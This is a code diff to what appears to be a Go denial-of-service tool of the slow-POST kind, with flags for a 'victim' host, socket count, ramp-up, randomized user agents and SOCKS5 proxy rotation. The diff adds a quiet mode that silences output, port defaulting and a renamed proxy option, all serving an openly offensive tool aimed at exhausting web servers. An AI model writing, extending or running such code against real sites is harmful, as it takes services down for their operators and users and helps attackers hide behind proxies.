@@ -22,10 +22,11 @@ var (
 	rampUp            = flag.Duration("ramUp", 10*time.Second, "Ramp up seconds")
 	https             = flag.Bool("https", false, "Whether to use tls or not")
 	randUserAgent     = flag.Bool("randUserAgent", false, "Randomizes user-agents with each request")
+	quiet             = flag.Bool("quiet", false, "Logs or nah")
 	destinationHost   = flag.String("destinationHost", "", "Victim's url. Http POST must be allowed in nginx config for this url")
-	destinationPort   = flag.String("destinationPort", "80", "Victim's port.")
+	destinationPort   = flag.String("destinationPort", "", "Victim's port.")
 	hostHeader        = flag.String("hostHeader", *destinationHost, "Host header value in case it is different than the hostname in victimUrl")
-	proxyList         = flag.String("proxyList", "", "SOCKS5 proxy port")
+	proxyPath         = flag.String("proxyPath", "", "SOCKS5 proxy port")
 )
 
 var (
@@ -73,9 +74,25 @@ func main() {
 		fmt.Printf("%s=%v\n", f.Name, f.Value)
 	})
 
+	if *quiet {
+		devNull, err := os.Open(os.DevNull)
+		if err != nil {
+			panic(fmt.Sprintf("Damn, how did this happen: [%s]", err))
+		}
+		os.Stdout = devNull
+	}
+
+	if len(*destinationPort) == 0 {
+		if *https {
+			*destinationPort = "443"
+		} else {
+			*destinationPort = "80"
+		}
+	}
+
 	destinationHostPort := net.JoinHostPort(*destinationHost, *destinationPort)
 
-	proxyList := generateProxyList(*proxyList)
+	proxyList := generateProxyList(*proxyPath)
 	for i:= 1 ; i <= *sockets ; i++ {
 		proxyHostPort := ""
 		if len(proxyList) != 0 {
@@ -133,6 +150,7 @@ func dialWorker(destinationHostPort, proxyHostPort string, requestHeader []byte)
 func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteCloser {
 	var conn net.Conn
 	var err error
+
 	if len(proxyHostPort) == 0 {
 		conn, err = net.Dial("tcp", destinationHostPort)
 	} else {
@@ -144,6 +162,7 @@ func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteClos
 		log.Printf("Connected to proxy: [%s]\n", proxyHostPort)
 		conn, err = dialer.Dial("tcp", destinationHostPort)
 	}
+
 	if err != nil {
 		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", destinationHostPort, err)
 		return nil
